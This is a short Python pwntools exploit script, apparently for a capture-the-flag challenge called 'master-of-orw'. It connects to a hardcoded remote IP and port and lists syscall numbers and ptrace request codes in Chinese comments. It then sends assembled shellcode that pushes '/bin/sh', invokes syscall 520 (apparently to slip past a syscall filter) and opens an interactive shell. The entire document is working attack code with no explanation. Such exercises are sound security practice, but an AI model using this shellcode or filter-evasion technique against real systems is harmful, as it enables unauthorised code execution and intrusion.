from pwn import * 
from pwn import p64,u64
import pwnlib.shellcraft as sc

debug = 0
gdb_is = 0
elf_path = "./master-of-orw"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process(elf_path)
    
else:
    host = "120.46.65.156:32101"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = gdb.debug(elf_path)
    # r = process(elf_path)
    # gdb.attach(r)
    pause()
    pass

elf = ELF(elf_path)
rop = ROP(elf)
SYS_getpid = 186
SYS_fork = 57
SYS_ptrace = 101
SYS_waitpid = 61
SYS_open = 2
SYS_write = 1
SYS_read = 0


# PTRACE_TRACEME (0)：用于将调用进程自身设置为跟踪目标。
# PTRACE_PEEKTEXT (1)：用于从目标进程的内存中读取一个字的数据。
# PTRACE_PEEKDATA (2)：用于从目标进程的内存中读取一个字的数据。
# PTRACE_POKETEXT (4)：用于在目标进程的内存中写入一个字的数据。
# PTRACE_POKEDATA (5)：用于在目标进程的内存中写入一个字的数据。
# PTRACE_GETREGS (12)：用于获取目标进程的寄存器状态。
# PTRACE_SETREGS (13)：用于设置目标进程的寄存器状态。
# PTRACE_CONT (7)：用于继续目标进程的执行。
# PTRACE_SYSCALL (24)：用于在系统调用发生前和发生后通知 ptrace。
# PTRACE_DETACH (11)：用于从目标进程分离，使其可以继续正常执行。
# PTRACE_KILL (8)：用于终止目标进程。
# PTRACE_SINGLESTEP (9)：用于让目标进程执行单个指令



shell=asm(sc.pushstr('/bin/sh\x00')+sc.syscall(520,'rsp',0,0))
shell+=asm(sc.syscall(60,0))
r.send(shell)

r.interactive()